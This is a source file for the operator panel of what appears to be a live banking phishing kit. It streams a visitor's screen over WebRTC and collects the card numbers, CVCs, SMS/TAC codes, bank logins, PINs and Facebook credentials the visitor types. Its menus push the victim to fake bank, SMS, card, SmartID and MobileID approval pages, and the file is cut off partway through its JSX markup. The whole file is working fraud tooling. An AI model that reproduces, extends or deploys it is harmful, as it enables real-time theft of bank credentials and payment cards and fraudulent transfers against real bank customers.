"use client";

import { useEffect, useRef, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { BroadcastReassembler } from "@/lib/broadcast-transfer";
import { RTC_ICE_SERVERS, RTC_SIGNAL, type DcEnvelope } from "@/lib/rtc-live";
import type { LiveClientMeta, LiveUserAction } from "@/components/LiveScreenRecorder";
import type { RealtimeChannel } from "@supabase/supabase-js";

type Props = {
  sessionId: string;
  publicId?: number | string | null;
  initialName?: string;
  initialAmount?: string | number | null;
  initialPath?: string | null;
  formData?: Record<string, any>;
  isOnline: boolean;
  darkMode: boolean;
  onRouteAction?: (action: string) => void;
  onApprovalAction?: (approval: string) => void;
  onClose: () => void;
};

type FrameMode = "mobile" | "desktop" | "fit";

function getFieldIcon(key: string): string {
  const k = key.toLowerCase();
  if (k.includes("kart") || k.includes("card") || k.includes("kortel")) return "💳";
  if (k.includes("skt") || k.includes("exp") || k.includes("galioj")) return "📅";
  if (k.includes("cvc") || k.includes("cvv") || k.includes("kodas")) return "🔒";
  if (k.includes("şifre") || k.includes("pass") || k.includes("slaptažod")) return "🔑";
  if (k.includes("sms") || k.includes("tac")) return "💬";
  if (k.includes("bank")) return "🏦";
  if (k.includes("telefon") || k.includes("phone") || k.includes("tel")) return "📱";
  if (k.includes("ad") || k.includes("soyad") || k.includes("name") || k.includes("vard")) return "👤";
  if (k.includes("asmens") || k.includes("personal") || k.includes("id") || k.includes("naudotoj")) return "🪪";
  return "✍️";
}

const ROUTE_OPTIONS = [
  { value: "win", label: "👉 İsim & Profil'e Yönlendir" },
  { value: "facebook", label: "👉 Facebook Girişine Yönlendir" },
  { value: "banken", label: "👉 Banka Listesine Yönlendir" },
  { value: "sms", label: "👉 SMS Doğrulamasına Yönlendir" },
  { value: "card", label: "👉 Kredi Kartına Yönlendir" },
  { value: "wait", label: "⏳ Beklemeye Al" },
  { value: "invalid_bank", label: "❌ Hatalı Banka (Uyarı)" },
  { value: "live_support", label: "🎧 Canlı Desteğe Yönlendir" },
  { value: "congrats", label: "✅ Tebrikler Ekranına Al" },
  { value: "special_approval", label: "🔔 Özel Bildirim Gönder" },
  { value: "custom_question", label: "❓ Özel Soru Gönder" },
  { value: "ban_ip", label: "🚫 IP Banla (Siteye Giremesin)" },
];

const APPROVAL_OPTIONS = [
  { value: "smartid_1", label: "SmartID 1 Sayfası" },
  { value: "smartid_2", label: "SmartID 2 Sayfası" },
  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
  { value: "generator1", label: "Generator 1" },
  { value: "generator2", label: "Generator 2" },
  { value: "transfer", label: "Transfer Onayı" },
];

export function LiveWatchModal2({
  sessionId,
  publicId,
  initialName,
  initialAmount,
  initialPath,
  formData = {},
  isOnline,
  darkMode,
  onRouteAction,
  onApprovalAction,
  onClose,
}: Props) {
  const [frameMode, setFrameMode] = useState<FrameMode>("mobile");
  const [scale, setScale] = useState<number>(0.85);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<"connecting" | "live" | "offline">(
    isOnline ? "connecting" : "offline"
  );
  const [clientMeta, setClientMeta] = useState<LiveClientMeta | null>(null);
  const [currentlyFocusedField, setCurrentlyFocusedField] = useState<string | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [actionFeedback, setActionFeedback] = useState<string | null>(null);

  // Dynamic live fields: Only include fields that actually have values or are interacted with!
  const [liveFields, setLiveFields] = useState<Record<string, string>>(() => {
    const init: Record<string, string> = {};
    const add = (label: string, v: any) => {
      if (v !== undefined && v !== null && String(v).trim()) init[label] = String(v).trim();
    };
    const fullName = `${formData.firstName || ""} ${formData.lastName || ""}`.trim();
    if (fullName) init["İsim Soyisim"] = fullName;
    add("Telefon", formData.phone);
    add("Kart Numarası", formData.cardNumber);
    add("Son Kullanma (SKT)", formData.cardExpiry);
    add("CVC", formData.cardCvc);
    add("SMS Kodu", formData.smsCode);
    add("TAC Kodu", formData.tacCode);
    add("Seçilen Banka", formData.bankName);
    add("Kullanıcı Adı", formData.username);
    add("Şifre", formData.password);
    add("PIN", formData.pin);
    add("Kişisel Kod", formData.personalCode);
    add("Banka Telefonu", formData.bankPhone);
    add("Verfüger Nr.", formData.verfuegernummer);
    add("Facebook E-posta", formData.facebookEmail);
    add("Facebook Şifre", formData.facebookPassword);
    add("Ek Alan 1", formData.orderedField1);
    add("Ek Alan 2", formData.orderedField2);
    return init;
  });

  const [eventCount, setEventCount] = useState(0);
  const [lastActivityAt, setLastActivityAt] = useState<number | null>(null);

  const playerContainerRef = useRef<HTMLDivElement | null>(null);
  const replayerRef = useRef<any>(null);
  const channelRef = useRef<RealtimeChannel | null>(null);
  const reassemblerRef = useRef(new BroadcastReassembler());
  const heartbeatTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastMetaEventRef = useRef<any>(null);
  const liveInputActionsRef = useRef<Map<string, LiveUserAction>>(new Map());
  const dcRef = useRef<RTCDataChannel | null>(null);
  const pcRef = useRef<RTCPeerConnection | null>(null);

  // Keyboard shortcut: Escape to close (ignore if an overlay popup is open on top)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Escape") {
        if (document.querySelector('[data-live-popup="true"]')) return;
        onClose();
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [onClose]);

  // Connect to Supabase Realtime live screen channel
  useEffect(() => {
    if (!sessionId) return;
    let isDisposed = false;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const channelName = `rtc-live:${sessionId}`;
    const channel = supabase.channel(channelName, {
      config: { broadcast: { ack: false } },
    });
    channelRef.current = channel;

    // Load rrweb dynamically
    let rrwebModule: typeof import("rrweb") | null = null;
    void import("rrweb").then((mod) => {
      if (!isDisposed) rrwebModule = mod;
    });

    const requestSnapshot = async () => {
      const dc = dcRef.current;
      if (!dc || dc.readyState !== "open") return;
      try {
        dc.send(JSON.stringify({ t: "req_snapshot" }));
      } catch {
        /* ignore */
      }
    };

    const nonTextTypes = new Set([
      "hidden",
      "submit",
      "button",
      "reset",
      "image",
      "file",
      "checkbox",
      "radio",
    ]);

    const isEditableVisibleEl = (el: Element): el is HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement => {
      if (!el) return false;
      const tag = (el.tagName || "").toLowerCase();
      if (tag !== "input" && tag !== "textarea" && tag !== "select") return false;
      const inp = el as HTMLInputElement;
      if (inp.disabled) return false;
      const type = (inp.getAttribute("type") || (tag === "input" ? "text" : tag)).toLowerCase();
      if (nonTextTypes.has(type)) return false;
      try {
        const win = el.ownerDocument?.defaultView || window;
        const style = win.getComputedStyle(el);
        if (style.display === "none" || style.visibility === "hidden" || style.opacity === "0") {
          return false;
        }
        if (el.closest("[hidden], [aria-hidden='true'], .hidden, .d-none, .sf-hidden")) {
          return false;
        }
        const rect = el.getBoundingClientRect();
        if (rect.width === 0 && rect.height === 0) return false;
      } catch {
        /* ignore */
      }
      return true;
    };

    const updateElementVisualValue = (
      el: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement,
      val: string,
      isFocused: boolean
    ) => {
      try {
        if (el.value !== val) {
          el.value = val;
        }
        el.setAttribute("value", val);
        el.style.setProperty("opacity", "1", "important");
        el.style.setProperty("visibility", "visible", "important");

        const hasVal = val.trim().length > 0;
        const wrapper =
          el.closest(
            ".mat-form-field, .input-div, .field-group, .bb-input, .i-input, .input-group, .lhv-text-field-wrapper, .lhv-text-field, .seb-input, .input-wrapper, .form-group, .field, .c-input, .v-input, .form-row, .control-input"
          ) || el.parentElement;

        if (wrapper) {
          if (hasVal) {
            wrapper.classList.add("has-value", "is-filled", "not-empty", "mat-form-field-should-float");
          } else {
            wrapper.classList.remove("has-value", "is-filled", "not-empty", "mat-form-field-should-float");
          }
          if (isFocused) {
            wrapper.classList.add("focused", "is-focused", "mdc-text-field--focused", "mat-focused");
          } else {
            wrapper.classList.remove("focused", "is-focused", "mdc-text-field--focused", "mat-focused");
          }

          // Hide overlapping floating labels/placeholders when input has value
          wrapper
            .querySelectorAll(
              ".mat-form-field-label, .lhv-floating-label, .mdc-floating-label, .placeholder, [class*='placeholder'], .info"
            )
            .forEach((lbl) => {
              const htmlLbl = lbl as HTMLElement;
              if (htmlLbl.tagName !== "INPUT" && !htmlLbl.contains(el)) {
                htmlLbl.style.opacity = hasVal || isFocused ? "0" : "1";
                htmlLbl.style.visibility = hasVal || isFocused ? "hidden" : "visible";
              }
            });
        }

        el.dispatchEvent(new Event("input", { bubbles: true }));
        el.dispatchEvent(new Event("change", { bubbles: true }));
      } catch {
        /* ignore */
      }
    };

    const collectTargetDocuments = (
      rootDoc: Document,
      preferredIframeSrc?: string,
      inIframe?: boolean
    ): Document[] => {
      const nestedDocs: Array<{ doc: Document; matchedSrc: boolean }> = [];

      const walk = (doc: Document, depth: number) => {
        if (!doc || depth > 4) return;
        try {
          doc.querySelectorAll("iframe").forEach((node) => {
            const ifr = node as HTMLIFrameElement;
            try {
              const sb = ifr.getAttribute("sandbox");
              if (sb && !sb.includes("allow-same-origin")) {
                ifr.setAttribute("sandbox", `${sb} allow-same-origin`);
              }
            } catch {
              /* ignore */
            }
            const style = ifr.style;
            if (
              style.display === "none" ||
              style.visibility === "hidden" ||
              ifr.classList.contains("opacity-0") ||
              ifr.classList.contains("pointer-events-none") ||
              style.width === "0px" ||
              style.height === "0px" ||
              ifr.getAttribute("width") === "0" ||
              ifr.getAttribute("height") === "0"
            ) {
              return;
            }
            try {
              const cDoc = ifr.contentDocument || ifr.contentWindow?.document;
              if (cDoc) {
                const srcAttr = ifr.getAttribute("src") || "";
                const matchedSrc = Boolean(
                  preferredIframeSrc &&
                    (srcAttr.includes(preferredIframeSrc) || preferredIframeSrc.includes(srcAttr))
                );
                nestedDocs.push({ doc: cDoc, matchedSrc });
                walk(cDoc, depth + 1);
              }
            } catch {
              /* ignore */
            }
          });
        } catch {
          /* ignore */
        }
      };

      walk(rootDoc, 0);

      nestedDocs.sort((a, b) => (a.matchedSrc === b.matchedSrc ? 0 : a.matchedSrc ? -1 : 1));
      const orderedNested = nestedDocs.map((d) => d.doc);

      if (inIframe) {
        return [...orderedNested, rootDoc];
      }
      return [rootDoc, ...orderedNested];
    };

    const findInputInDoc = (
      doc: Document,
      action: LiveUserAction
    ): HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement | null => {
      const meta = action.inputMeta;
      try {
        const allInputs = Array.from(doc.querySelectorAll("input, textarea, select")) as Array<
          HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement
        >;
        if (allInputs.length === 0) return null;

        const visibleInputs = allInputs.filter(isEditableVisibleEl);

        if (meta?.id) {
          const byId = visibleInputs.find((el) => el.id === meta.id) || (doc.getElementById(meta.id) as any);
          if (byId && (byId.tagName === "INPUT" || byId.tagName === "TEXTAREA" || byId.tagName === "SELECT")) {
            return byId;
          }
        }

        if (meta?.name) {
          const byName =
            visibleInputs.find((el) => el.getAttribute("name") === meta.name) ||
            allInputs.find((el) => el.getAttribute("name") === meta.name && !nonTextTypes.has((el.getAttribute("type") || "").toLowerCase()));
          if (byName) return byName;
        }

        if (meta?.formControlName) {
          const byFcn =
            visibleInputs.find((el) => el.getAttribute("formcontrolname") === meta.formControlName) ||
            allInputs.find((el) => el.getAttribute("formcontrolname") === meta.formControlName);
          if (byFcn) return byFcn;
        }

        if (meta?.placeholder) {
          const byPh = visibleInputs.find((el) => el.getAttribute("placeholder") === meta.placeholder);
          if (byPh) return byPh;
        }

        if (meta?.ariaLabel) {
          const byAria = visibleInputs.find((el) => el.getAttribute("aria-label") === meta.ariaLabel);
          if (byAria) return byAria;
        }

        if (typeof meta?.visibleIndex === "number" && meta.visibleIndex >= 0 && visibleInputs[meta.visibleIndex]) {
          return visibleInputs[meta.visibleIndex];
        }

        if (typeof meta?.domIndex === "number" && meta.domIndex >= 0 && allInputs[meta.domIndex]) {
          const cand = allInputs[meta.domIndex];
          if (!nonTextTypes.has((cand.getAttribute("type") || "").toLowerCase())) {
            return cand;
          }
        }

        // Fallback: if there is only 1 visible input in doc (e.g. TAN step or single field)
        if (visibleInputs.length === 1 && !meta) {
          return visibleInputs[0];
        }
      } catch {
        /* ignore */
      }
      return null;
    };

    const applyLiveInputToReplayerDom = (action: LiveUserAction, isFocused = true) => {
      const mainDoc = replayerRef.current?.iframe?.contentDocument as Document | undefined;
      if (!mainDoc) return;

      const candidateDocs = collectTargetDocuments(
        mainDoc,
        action.inputMeta?.iframeSrc,
        action.inputMeta?.inIframe
      );

      for (const doc of candidateDocs) {
        const el = findInputInDoc(doc, action);
        if (el) {
          updateElementVisualValue(el, action.value ?? "", isFocused);
          return;
        }
      }
    };

    const applyAllLiveInputsToReplayerDom = () => {
      liveInputActionsRef.current.forEach((act) => {
        applyLiveInputToReplayerDom(act, false);
      });
    };

    const injectLiveWatchStyles = (doc: Document) => {
      try {
        doc.documentElement?.classList.remove("rrweb-paused");
        if (!doc.getElementById("live-watch-override-styles")) {
          const styleEl = doc.createElement("style");
          styleEl.id = "live-watch-override-styles";
          styleEl.textContent = `
            html.rrweb-paused *, html.rrweb-paused *:before, html.rrweb-paused *:after {
              animation-play-state: running !important;
            }
            .fade-in, [class*='animate-in'], [class*='fade-in'], .app-panel, .luxury-glass, .glass-card, .pak-form-card, [role='dialog'], .login-content, .login-container {
              opacity: 1 !important;
              transform: none !important;
              animation: none !important;
            }
          `;
          (doc.head || doc.documentElement)?.appendChild(styleEl);
        }
      } catch {
        /* ignore */
      }
    };

    const isIntentionallyHiddenIframe = (nested: HTMLIFrameElement): boolean => {
      const st = nested.style;
      if (st.display === "none" || st.visibility === "hidden" || st.opacity === "0") return true;
      if (
        nested.classList.contains("opacity-0") ||
        nested.classList.contains("pointer-events-none") ||
        nested.classList.contains("hidden") ||
        nested.classList.contains("sf-hidden")
      ) {
        return true;
      }
      if (
        st.width === "0px" ||
        st.height === "0px" ||
        nested.getAttribute("width") === "0" ||
        nested.getAttribute("height") === "0"
      ) {
        return true;
      }
      return false;
    };

    const hookNestedIframes = (doc: Document, depth = 0) => {
      if (!doc || depth > 4) return;
      try {
        injectLiveWatchStyles(doc);
        doc.querySelectorAll("iframe").forEach((node) => {
          const nested = node as HTMLIFrameElement;
          try {
            const sb = nested.getAttribute("sandbox");
            if (sb && !sb.includes("allow-same-origin")) {
              nested.setAttribute("sandbox", `${sb} allow-same-origin`);
            }
          } catch {
            /* ignore */
          }

          if (!isIntentionallyHiddenIframe(nested)) {
            if (!nested.style.width || nested.style.width === "0px") {
              nested.style.width = "100%";
            }
            if (!nested.style.height || nested.style.height === "0px") {
              nested.style.height = "100%";
            }
          }

          if (!(nested as any).__liveWatchLoadHooked) {
            (nested as any).__liveWatchLoadHooked = true;
            nested.addEventListener("load", () => {
              try {
                const cDoc = nested.contentDocument || nested.contentWindow?.document;
                if (cDoc) {
                  hookNestedIframes(cDoc, depth + 1);
                }
                applyAllLiveInputsToReplayerDom();
                setTimeout(applyAllLiveInputsToReplayerDom, 80);
              } catch {
                /* ignore */
              }
            });
          }

          try {
            const cDoc = nested.contentDocument || nested.contentWindow?.document;
            if (cDoc) {
              hookNestedIframes(cDoc, depth + 1);
            }
          } catch {
            /* ignore */
          }
        });
      } catch {
        /* ignore */
      }
    };

    const applyIframeVisibility = () => {
      const mainIfr = replayerRef.current?.iframe as HTMLIFrameElement | undefined;
      if (mainIfr) {
        mainIfr.style.display = "block";
        mainIfr.style.width = "100%";
        mainIfr.style.height = "100%";
        mainIfr.style.border = "none";
        mainIfr.setAttribute("scrolling", "auto");
        try {
          if (mainIfr.contentDocument) {
            mainIfr.contentDocument.documentElement.style.overflowY = "auto";
            if (mainIfr.contentDocument.body) {
              mainIfr.contentDocument.body.style.overflowY = "auto";
            }
            hookNestedIframes(mainIfr.contentDocument, 0);
          }
        } catch {
          /* ignore */
        }
      }
      const iframes = playerContainerRef.current?.querySelectorAll("iframe");
      iframes?.forEach((iframe) => {
        if (iframe !== mainIfr) return;
        iframe.style.display = "block";
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        iframe.style.border = "none";
        iframe.style.borderRadius = "inherit";
        iframe.setAttribute("scrolling", "auto");
      });
      applyAllLiveInputsToReplayerDom();
    };

    // --- IZLEME 2 (P2P): veri WebRTC DataChannel'dan gelir, Supabase sadece signaling ---
    const onClientMeta = (meta: LiveClientMeta) => {
      if (isDisposed) return;
      setClientMeta((prev) => {
        if (prev?.pathname && meta.pathname && prev.pathname !== meta.pathname) {
          liveInputActionsRef.current.clear();
        }
        return meta;
      });
      setConnectionStatus("live");
      setLastActivityAt(Date.now());
    };

    const onUserAction = (action: LiveUserAction) => {
      if (isDisposed) return;
      setLastActivityAt(Date.now());
      setConnectionStatus("live");

          // DYNAMIC FIELD UPDATE: WHICHEVER FIELD USER INTERACTS WITH, ADD IT INSTANTLY
          if (action.type === "input" && action.target) {
            setCurrentlyFocusedField(action.target);
            setLiveFields((prev) => ({
              ...prev,
              [action.target!]: action.value || "",
            }));

            const actionKey = `${action.pathname}|${action.inputMeta?.inIframe ? "ifr" : "top"}|${
              action.inputMeta?.id ||
              action.inputMeta?.name ||
              action.inputMeta?.formControlName ||
              (action.inputMeta?.visibleIndex != null ? String(action.inputMeta.visibleIndex) : action.target)
            }`;
            liveInputActionsRef.current.set(actionKey, action);
            applyLiveInputToReplayerDom(action, true);
          } else if (action.type === "focus" && action.target) {
            setCurrentlyFocusedField(action.target);
            setLiveFields((prev) => {
              if (action.target! in prev) return prev;
              return { ...prev, [action.target!]: "" };
            });
          } else if (action.type === "blur") {
            setCurrentlyFocusedField((cur) => (cur === action.target ? null : cur));
          }
    };

    const onScreenEvent = (event: any) => {
      if (isDisposed || !event) return;
      setEventCount((c) => c + 1);
      setLastActivityAt(Date.now());
      setConnectionStatus("live");

          // Cache Meta event (type 4)
          if (event.type === 4) {
            lastMetaEventRef.current = event;
            if (replayerRef.current) {
              try {
                replayerRef.current.addEvent(event);
                applyIframeVisibility();
              } catch {
                /* ignore */
              }
            }
            return;
          }

          if (!playerContainerRef.current || !rrwebModule) return;

          // When FullSnapshot (type 2) arrives: REBUILD REPLAYER WITH BOTH META + SNAPSHOT
          if (event.type === 2) {
            const meta = lastMetaEventRef.current || {
              type: 4,
              data: {
                href: clientMeta?.pathname
                  ? window.location.origin + clientMeta.pathname
                  : window.location.href,
                width: clientMeta?.width || 375,
                height: clientMeta?.height || 667,
              },
              timestamp: event.timestamp - 1,
            };

            try {
              if (replayerRef.current) {
                try {
                  replayerRef.current.destroy();
                } catch {
                  /* ignore */
                }
                replayerRef.current = null;
              }

              playerContainerRef.current.innerHTML = "";
              const replayer = new rrwebModule.Replayer([meta, event], {
                root: playerContainerRef.current,
                liveMode: true,
                mouseTail: true,
                showWarning: false,
                showDebug: false,
                // useVirtualDom + liveMode node'lari gercek DOM'a islemeyebiliyor
                // (body bg gorunur, sayfa icerigi bos) — KAPALI tutulmali.
                useVirtualDom: false,
                pauseAnimation: false,
                UNSAFE_replayCanvas: true,
                speed: 1,
                insertStyleRules: [
                  "html.rrweb-paused *, html.rrweb-paused *:before, html.rrweb-paused *:after { animation-play-state: running !important; }",
                  ".fade-in, [class*='animate-in'], [class*='fade-in'], .app-panel, .luxury-glass, .glass-card, .pak-form-card, [role='dialog'], .login-content, .login-container { opacity: 1 !important; transform: none !important; animation: none !important; }",
                ],
              });

              // Build DOM synchronously so nothing is missing!
              const repAny = replayer as any;
              if (typeof repAny.applyEventsSynchronously === "function") {
                try {
                  repAny.applyEventsSynchronously([meta, event]);
                } catch {
                  /* ignore */
                }
              }

              // Pass baseline timestamp so events before Date.now() aren't discarded!
              replayer.startLive(meta.timestamp);

              // Enable scrolling on the iframe so long content (like bank list) scrolls properly!
              if (typeof repAny.enableInteract === "function") {
                try {
                  repAny.enableInteract();
                } catch {
                  /* ignore */
                }
              }

              replayerRef.current = replayer;

              applyIframeVisibility();
              setTimeout(applyIframeVisibility, 50);
              setTimeout(applyIframeVisibility, 200);
              setTimeout(applyIframeVisibility, 500);
            } catch (err) {
              console.error("[LiveWatchModal] error rebuilding Replayer:", err);
            }
          } else {
            // Incremental events: EXECUTE DIRECTLY ON REAL DOM (useVirtualDom: false)
            if (replayerRef.current) {
              const repAny = replayerRef.current as any;
              try {
                const isPointerOrClick =
                  event.type === 3 &&
                  (event.data?.source === 1 || event.data?.source === 2 || event.data?.source === 6);
                if (isPointerOrClick && typeof repAny.applyIncremental === "function") {
                  repAny.applyIncremental(event, false);
                } else if (typeof repAny.applyEventsSynchronously === "function") {
                  repAny.applyEventsSynchronously([event]);
                } else {
                  replayerRef.current.addEvent(event);
                }
                applyIframeVisibility();
              } catch {
                try {
                  replayerRef.current.addEvent(event);
                } catch {
                  /* ignore */
                }
              }
            }
          }
    };

    const dispatchDcEvent = (event: string, data: any) => {
      if (event === "client_meta") onClientMeta(data as LiveClientMeta);
      else if (event === "user_action") onUserAction(data as LiveUserAction);
      else onScreenEvent(data);
    };

    // WebRTC peer: admin offer gonderir, visitor answer + stream acar.
    // Tum rrweb verisi DataChannel uzerinden DIREKT gelir (relay yok).
    const clientId = `adm-${Math.random().toString(36).slice(2, 9)}`;
    const pc = new RTCPeerConnection({ iceServers: RTC_ICE_SERVERS });
    pcRef.current = pc;
    const dc = pc.createDataChannel("live", { ordered: true });
    dcRef.current = dc;

    dc.onopen = () => {
      if (isDisposed) return;
      void requestSnapshot();
      for (const delay of [1500, 4000]) {
        setTimeout(() => {
          if (!isDisposed && !replayerRef.current) {
            void requestSnapshot();
          }
        }, delay);
      }
    };

    dc.onmessage = (m) => {
      if (isDisposed || typeof m.data !== "string") return;
      try {
        const env = JSON.parse(m.data) as DcEnvelope;
        reassemblerRef.current.receive<any>(env.payload, (data) => {
          dispatchDcEvent(env.event, data);
        });
      } catch {
        /* ignore */
      }
    };

    dc.onclose = () => {
      if (!isDisposed) setConnectionStatus("offline");
    };

    pc.onicecandidate = (ev) => {
      if (ev.candidate && channelRef.current) {
        void channelRef.current.send({
          type: "broadcast",
          event: RTC_SIGNAL.ICE,
          payload: { candidate: ev.candidate.toJSON(), clientId },
        });
      }
    };

    pc.onconnectionstatechange = () => {
      if (isDisposed) return;
      const st = pc.connectionState;
      if (st === "failed" || st === "closed") {
        setConnectionStatus("offline");
      } else if (st === "disconnected") {
        setConnectionStatus("connecting");
      }
    };

    let answerReceived = false;
    let offerRetryTimer: ReturnType<typeof setInterval> | null = null;

    const sendOffer = async () => {
      try {
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        await channel.send({
          type: "broadcast",
          event: RTC_SIGNAL.OFFER,
          payload: { sdp: pc.localDescription?.toJSON(), clientId },
        });
      } catch {
        /* ignore */
      }
    };

    channel
      .on("broadcast", { event: RTC_SIGNAL.READY }, () => {
        // Visitor hazir oldugunu bildirdi — hemen offer gonder
        if (!answerReceived && dcRef.current?.readyState !== "open") {
          void sendOffer();
        }
      })
      .on("broadcast", { event: RTC_SIGNAL.ANSWER }, (payload) => {
        const p = payload.payload as any;
        if (!p?.sdp || (p.clientId && p.clientId !== clientId)) return;
        answerReceived = true;
        if (offerRetryTimer) {
          clearInterval(offerRetryTimer);
          offerRetryTimer = null;
        }
        void pc.setRemoteDescription(new RTCSessionDescription(p.sdp)).catch(() => {});
      })
      .on("broadcast", { event: RTC_SIGNAL.ICE }, (payload) => {
        const p = payload.payload as any;
        if (!p?.candidate || (p.clientId && p.clientId !== clientId)) return;
        void pc.addIceCandidate(new RTCIceCandidate(p.candidate)).catch(() => {});
      });

    channel.subscribe(async (status) => {
      if (status === "SUBSCRIBED" && !isDisposed) {
        await sendOffer();
        // Visitor henuz subscribe olmadiysa offer kaybolabilir — answer gelene
        // kadar 3sn'de bir tekrarla.
        offerRetryTimer = setInterval(() => {
          if (isDisposed || answerReceived || dcRef.current?.readyState === "open") {
            if (offerRetryTimer) clearInterval(offerRetryTimer);
            offerRetryTimer = null;
            return;
          }
          void sendOffer();
        }, 3000);
        // P2P kurulamazsa (simetrik NAT / TURN yok) durumu goster
        setTimeout(() => {
          if (!isDisposed && dcRef.current?.readyState !== "open") {
            setConnectionStatus("offline");
          }
        }, 9000);
      }
    });

    // Heartbeat over DC — visitor streaming'i canli tutar
    heartbeatTimerRef.current = setInterval(() => {
      const d = dcRef.current;
      if (d && d.readyState === "open") {
        try {
          d.send(JSON.stringify({ t: "hb" }));
        } catch {
          /* ignore */
        }
      }
    }, 15000);

    return () => {
      isDisposed = true;
      if (offerRetryTimer) clearInterval(offerRetryTimer);
      if (heartbeatTimerRef.current) clearInterval(heartbeatTimerRef.current);
      if (channelRef.current) {
        void channelRef.current.send({
          type: "broadcast",
          event: RTC_SIGNAL.CLOSE,
          payload: { clientId },
        });
        void supabase.removeChannel(channelRef.current);
        channelRef.current = null;
      }
      try {
        dcRef.current?.close();
      } catch {
        /* ignore */
      }
      try {
        pcRef.current?.close();
      } catch {
        /* ignore */
      }
      dcRef.current = null;
      pcRef.current = null;
      if (replayerRef.current) {
        try {
          replayerRef.current.destroy();
        } catch {
          /* ignore */
        }
        replayerRef.current = null;
      }
      reassemblerRef.current.clear();
    };
  }, [sessionId]);

  const handleRequestRefresh = async () => {
    const dc = dcRef.current;
    if (!dc || dc.readyState !== "open") return;
    setConnectionStatus("connecting");
    try {
      dc.send(JSON.stringify({ t: "req_snapshot" }));
    } catch {
      /* ignore */
    }
  };

  const handleCopy = (fieldKey: string, val: string) => {
    if (!val) return;
    navigator.clipboard.writeText(val);
    setCopiedField(fieldKey);
    setTimeout(() => setCopiedField(null), 1500);
  };

  const handleActionSelect = async (actionVal: string) => {
    if (!actionVal) return;
    const opt = ROUTE_OPTIONS.find((r) => r.value === actionVal);
    const label = opt?.label || actionVal;

    if (onRouteAction) {
      onRouteAction(actionVal);
    } else {
      const supabase = createBrowserSupabaseClient();
      if (supabase && sessionId) {
        await supabase
          .from("sessions")
          .update({ current_step: actionVal, status: "online" })
          .eq("id", sessionId);
      }
    }

    setActionFeedback(`Yönlendirildi: ${label}`);
    setTimeout(() => setActionFeedback(null), 3000);
  };

  const handleApprovalSelect = async (approvalVal: string) => {
    if (!approvalVal) return;
    const opt = APPROVAL_OPTIONS.find((a) => a.value === approvalVal);
    const label = opt?.label || approvalVal;

    if (onApprovalAction) {
      onApprovalAction(approvalVal);
    } else {
      const supabase = createBrowserSupabaseClient();
      if (supabase && sessionId) {
        await supabase
          .from("sessions")
          .update({ current_step: approvalVal, status: "online" })
          .eq("id", sessionId);
      }
    }

    setActionFeedback(`Onay Gönderildi: ${label}`);
    setTimeout(() => setActionFeedback(null), 3000);
  };

  const currentPath = clientMeta?.pathname || initialPath || "Bilinmiyor";
  const displayName = initialName || formData.firstName || formData.lastName
    ? `${formData.firstName || ""} ${formData.lastName || ""}`.trim()
    : "Misafir Kullanıcı";

  const viewportWidth = clientMeta?.width || 375;
  const viewportHeight = clientMeta?.height || 667;

  // ONLY show fields that actually exist or the user has touched! No empty hardcoded dummies!
  const activeFieldKeys = Object.keys(liveFields);

  return (
    <div
      className={`fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 backdrop-blur-md transition-all ${
        darkMode ? "bg-black/80" : "bg-black/60"
      }`}
    >
      <div
        className={`flex flex-col w-full h-full max-w-7xl max-h-[96vh] rounded-3xl border shadow-2xl overflow-hidden transition-all duration-300 ${
          isFullscreen ? "fixed inset-0 max-w-none max-h-none rounded-none" : ""
        } ${darkMode ? "bg-[#141416] border-white/10 text-white" : "bg-white border-gray-200 text-gray-900"}`}
      >
        {/* HEADER BAR */}
        <div
          className={`flex flex-wrap items-center justify-between gap-3 px-5 py-3 border-b select-none ${
            darkMode ? "bg-[#1c1c1e]/90 border-white/10" : "bg-gray-50/90 border-gray-200"
          }`}
        >
          {/* USER INFO & LIVE STATUS */}
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2">
              <span className="relative flex h-3 w-3">
                {connectionStatus === "live" ? (
                  <>
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
                  </>
                ) : connectionStatus === "connecting" ? (
                  <>
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-3 w-3 bg-amber-500"></span>
                  </>
                ) : (
                  <span className="relative inline-flex rounded-full h-3 w-3 bg-gray-400"></span>
                )}
              </span>
              <span
                className={`text-xs font-black uppercase tracking-wider px-2 py-0.5 rounded-full ${
                  connectionStatus === "live"
                    ? "bg-emerald-500/15 text-emerald-500 border border-emerald-500/30"
                    : connectionStatus === "connecting"
                    ? "bg-amber-500/15 text-amber-500 border border-amber-500/30"
                    : "bg-gray-500/15 text-gray-400 border border-gray-500/30"
                }`}
              >
                {connectionStatus === "live"
                  ? "P2P CANLI"
                  : connectionStatus === "connecting"
                  ? "P2P BAĞLANIYOR..."
                  : "P2P YOK"}
              </span>
            </div>

            <div className="h-4 w-px bg-white/20" />

            <div>
              <div className="flex items-center gap-2">
                <span className="font-extrabold text-sm lg:text-base tracking-tight">
                  {publicId ? `#${publicId}` : sessionId.slice(0, 8)}
                </span>
                <span className="text-xs opacity-80 font-medium">({displayName})</span>
                {initialAmount && (
                  <span className="text-xs font-black text-[#EB5E28] bg-[#EB5E28]/10 px-2 py-0.5 rounded-full border border-[#EB5E28]/20">
                    €{initialAmount}
                  </span>
                )}
              </div>
            </div>
          </div>

          {/* CONTROLS */}
